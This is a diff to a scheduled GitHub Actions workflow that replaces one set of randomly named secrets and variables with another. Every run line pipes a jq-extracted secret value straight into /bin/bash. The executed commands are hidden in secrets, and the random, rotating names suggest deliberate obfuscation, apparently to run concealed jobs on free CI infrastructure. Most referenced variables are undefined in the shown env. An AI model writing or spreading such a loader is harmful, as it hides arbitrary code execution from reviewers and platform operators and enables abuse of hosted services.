@@ -2,30 +2,24 @@ name: ruanxiaowu19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 4/6 * * *'
+    - cron: '45 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: ruanxiaowu19871010
         env:
-          mcphk84331: ${{ secrets.mcphk84331 }}
+          ms8796: ${{ secrets.ms8796 }}
         run: |
-          echo $mcphk84331 | jq -r .vmrul14433 | /bin/bash
-          echo $ado5 | jq -r .d7 | /bin/bash
-          echo $nnew3 | jq -r .vpd8269 | /bin/bash
-          echo $nesvx54672 | jq -r .bmdo8113 | /bin/bash
-          echo $p93 | jq -r .bk3500 | /bin/bash
-          echo $xdh52 | jq -r .vbap09475 | /bin/bash
-          echo $jqlco0 | jq -r .gdq50897 | /bin/bash
-          echo $tr04612 | jq -r .jnbz19855 | /bin/bash
-          echo $a9 | jq -r .l17 | /bin/bash
-          echo $cbyt09873 | jq -r .zsa48 | /bin/bash
-          echo $ub93253 | jq -r .tsu80527 | /bin/bash
-          echo $n480 | jq -r .ojoc1239 | /bin/bash
-          echo $ne54992 | jq -r .sapy11 | /bin/bash
-          echo $gsstz89 | jq -r .cdd424 | /bin/bash
+          echo $ms8796 | jq -r .b655 | /bin/bash
+          echo $zynn0 | jq -r .izl36022 | /bin/bash
+          echo $nqsll128 | jq -r .lzq99 | /bin/bash
+          echo $vs65221 | jq -r .py60503 | /bin/bash
+          echo $falo527 | jq -r .at8828 | /bin/bash
+          echo $ykm60385 | jq -r .sdfq341 | /bin/bash
+          echo $sfjr73 | jq -r .ytwz2349 | /bin/bash
+          echo $mwloc227 | jq -r .dk686 | /bin/bash
+          echo $vudb997 | jq -r .k3 | /bin/bash
 
